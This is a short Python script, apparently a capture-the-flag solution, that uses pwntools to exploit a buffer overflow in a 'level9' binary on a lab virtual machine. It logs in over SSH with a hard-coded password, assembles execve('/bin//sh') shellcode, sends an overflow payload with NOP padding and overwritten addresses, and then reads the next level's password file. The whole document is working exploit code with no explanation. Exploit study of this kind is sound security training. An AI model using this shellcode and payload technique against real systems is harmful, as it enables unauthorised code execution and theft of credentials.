from pwn import *

# assembly code => execv('/bin//sh')
shellcode = asm('''
_start:
    xor eax, eax
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    push edx
    mov ebx, 0x68732f2f
    push ebx
    mov ebx, 0x6e69622f
    push ebx
    mov ebx, esp
    int 0x80
''')

# Change host according to your configuration
s = ssh(
    user="level9",
    host="192.168.56.101",
    password="c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a",
    port=4242
)

payload = (
    p32(0x0804a010) + bytes(shellcode) + b"\x90" * 79 + p32(0x0804a00c)
)

p = s.process( ["/home/user/level9/level9", payload] )
p.sendline(b"cat /home/user/bonus0/.pass")


#p.interactive()
p.stream()

p.close()
s.close()
